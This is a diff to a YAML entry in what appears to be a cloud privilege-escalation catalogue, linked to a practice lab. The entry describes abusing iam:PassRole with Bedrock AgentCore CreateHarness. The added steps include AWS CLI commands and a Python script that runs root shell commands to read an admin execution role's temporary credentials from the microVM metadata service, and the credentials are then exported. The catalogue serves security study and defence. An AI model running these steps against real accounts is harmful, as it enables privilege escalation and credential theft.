@@ -1,5 +1,5 @@
 id: bedrock-005
-name: iam:PassRole + bedrock-agentcore:CreateHarness + bedrock-agentcore:CreateAgentRuntime + bedrock-agentcore:CreateAgentRuntimeEndpoint + bedrock-agentcore:CreateWorkloadIdentity + bedrock-agentcore:GetAgentRuntime + bedrock-agentcore:InvokeAgentRuntimeCommand
+name: iam:PassRole + bedrock-agentcore:CreateHarness + bedrock-agentcore:CreateAgentRuntime + bedrock-agentcore:CreateAgentRuntimeEndpoint + bedrock-agentcore:CreateWorkloadIdentity + bedrock-agentcore:CreateMemory + bedrock-agentcore:GetMemory + bedrock-agentcore:GetAgentRuntime + bedrock-agentcore:GetHarness + bedrock-agentcore:InvokeAgentRuntimeCommand
 category: new-passrole
 services:
 - iam
@@ -16,8 +16,14 @@ permissions:
     resourceConstraints: Required to create the runtime endpoint the harness uses
   - permission: bedrock-agentcore:CreateWorkloadIdentity
     resourceConstraints: Required to create the workload identity the underlying runtime needs
+  - permission: bedrock-agentcore:CreateMemory
+    resourceConstraints: AWS requires this permission on every CreateHarness call regardless of the memory configuration chosen, including when memory is explicitly disabled
+  - permission: bedrock-agentcore:GetMemory
+    resourceConstraints: Required alongside CreateMemory as part of CreateHarness's managed-memory provisioning
   - permission: bedrock-agentcore:GetAgentRuntime
     resourceConstraints: Required to resolve the runtime that CreateHarness provisions before invoking it
+  - permission: bedrock-agentcore:GetHarness
+    resourceConstraints: Required to poll the harness status until it reaches READY before invoking commands
   - permission: bedrock-agentcore:InvokeAgentRuntimeCommand
     resourceConstraints: Must have permission to invoke commands on the created harness
   additional:
@@ -30,8 +36,10 @@ prerequisites:
   admin:
   - A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it
   - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  - At least one Bedrock foundation model must be enabled in the account (required at CreateHarness time to specify which model backs the Harness; the model is never invoked by the attack)
   lateral:
   - A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it
+  - At least one Bedrock foundation model must be enabled in the account (required at CreateHarness time to specify which model backs the Harness; the model is never invoked by the attack)
 exploitationSteps:
   awscli:
   - step: 1
@@ -47,35 +55,58 @@ exploitationSteps:
     description: Set up session variables and confirm jq is installed
   - step: 2
     command: |
-      HARNESS_ARN=$(aws bedrock-agentcore-control create-harness \
+      CREATE_OUTPUT=$(aws bedrock-agentcore-control create-harness \
         --harness-name atk_harness \
         --execution-role-arn $EXECUTION_ROLE \
-        --model "{\"bedrockModelConfig\":{\"modelId\":\"$MODEL_ID\"}}" | jq -r .harnessArn)
-    description: Create a harness with the privileged execution role. CreateHarness provisions a runtime, endpoint and workload identity under the hood, hence the longer permission chain
+        --model "{\"bedrockModelConfig\":{\"modelId\":\"$MODEL_ID\"}}" \
+        --memory '{"disabled":{}}')
+      HARNESS_ARN=$(echo "$CREATE_OUTPUT" | jq -r .harness.arn)
+      HARNESS_ID=$(echo "$CREATE_OUTPUT" | jq -r .harness.harnessId)
+    description: Create a harness with the privileged execution role. CreateHarness provisions a runtime, endpoint, workload identity and memory resource under the hood, hence the longer permission chain. Memory is disabled since this attack never uses the managed agent loop, but AWS still requires the memory-related permissions on every CreateHarness call
   - step: 3
+    command: |
+      while true; do
+        STATUS=$(aws bedrock-agentcore-control get-harness \
+          --harness-id $HARNESS_ID --query 'harness.status' --output text)
+        [ "$STATUS" = "READY" ] && break
+        sleep 15
+      done
+    description: Poll the harness until it reaches READY state. The underlying runtime takes a few minutes to provision, and InvokeAgentRuntimeCommand fails until it is ready
+  - step: 4
     command: |
       cat << 'EOF' > "get_creds_from_harness.py"
       import boto3, sys, uuid
       client = boto3.client("bedrock-agentcore", region_name=sys.argv[2])
 
-      command = """bash -c '
-      TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
-      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
-      '"""
+      def run(cmd):
+        response = client.invoke_agent_runtime_command(
+          agentRuntimeArn=sys.argv[1],
+          runtimeSessionId=str(uuid.uuid4()),
+          body={"command": cmd, "timeout": 30},
+        )
+        out = ""
+        for event in response["stream"]:
+          chunk = event["chunk"]
+          if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
+            out += chunk["contentDelta"]["stdout"]
+        return out
 
-      # sys.argv[1] is the harness ARN, not the underlying runtime ARN
-      response = client.invoke_agent_runtime_command(
-        agentRuntimeArn=sys.argv[1],
-        runtimeSessionId=str(uuid.uuid4()),
-        body={"command": command, "timeout": 30},
-      )
-      for event in response["stream"]:
-        chunk = event["chunk"]
-        if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
-          print(chunk["contentDelta"]["stdout"], end="")
+      # The execution role's MMDS alias is not necessarily known in advance, so
+      # discover it before fetching credentials, mirroring EC2 IMDS role discovery.
+      token_and_role = run("""bash -c '
+      TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+      echo $TOKEN
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      '""")
+      token, role_name = token_and_role.strip().split("\n")
+
+      creds = run(f"""bash -c '
+      curl -s -H "X-aws-ec2-metadata-token: {token}" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}
+      '""")
+      print(creds, end="")
       EOF
-    description: Create the python file that submits a root shell command reading the execution role credentials from MMDS
-  - step: 4
+    description: Create the python file that first discovers the execution role's name from MMDS, then submits a root shell command reading its temporary credentials
+  - step: 5
     command: 'CREDS=$(python3 get_creds_from_harness.py $HARNESS_ARN $AWS_REGION)
 
       echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")
@@ -86,12 +117,12 @@ exploitationSteps:
 
       '
     description: Run the python file using the $HARNESS_ARN to extract the execution role credentials
-  - step: 5
-    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>
+  - step: 6
+    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>
 
-      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>
 
-      export AWS_SESSION_TOKEN=<Token from step 4>
+      export AWS_SESSION_TOKEN=<Token from step 5>
 
       aws sts get-caller-identity
 
@@ -148,6 +179,12 @@ relatedPaths:
 - bedrock-004
 - ec2-001
 - sagemaker-001
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: privesc-one-hop/to-admin/iam-passrole+bedrockagentcore-createharness
+    description: Deploy Terraform into your own AWS account to practice this attack path
 attackVisualization:
   nodes:
   - id: start
@@ -161,7 +198,7 @@ attackVisualization:
   - id: target_role
     label: Existing Role That Trusts the bedrock-agentcore Service
     type: principal
-    description: The IAM role passed to the harness as its execution role. The role must trust bedrock-agentcore.amazonaws.com to assume it. AgentCore assumes the role and serves its temporary credentials on MMDS at the execution_role endpoint inside the microVM.
+    description: The IAM role passed to the harness as its execution role. The role must trust bedrock-agentcore.amazonaws.com to assume it. AgentCore assumes the role, waits for the harness to reach READY, and then serves its temporary credentials on MMDS at a security-credentials endpoint named after the role inside the microVM. The attacker discovers this name by requesting the security-credentials path with no role name before fetching credentials, mirroring EC2 IMDS role discovery.
   - id: method_sdk_attack
     label: 'Method 1: Act directly from the root shell'
     type: payload
@@ -185,7 +222,8 @@ attackVisualization:
       Example command body invoked through InvokeAgentRuntimeCommand:
       ```bash
       TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
-      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
+      ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
       ```
 
       This returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire.
@@ -220,7 +258,7 @@ attackVisualization:
   - from: harness
     to: target_role
     label: Harness runtime assumes the execution role
-    description: AgentCore assumes the passed execution role and serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role inside the harness microVM.
+    description: The attacker polls GetHarness until the harness reaches READY. AgentCore then assumes the passed execution role and serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt; inside the harness microVM, where the role name is discovered rather than assumed.
   - from: target_role
     to: method_sdk_attack
     label: Option A
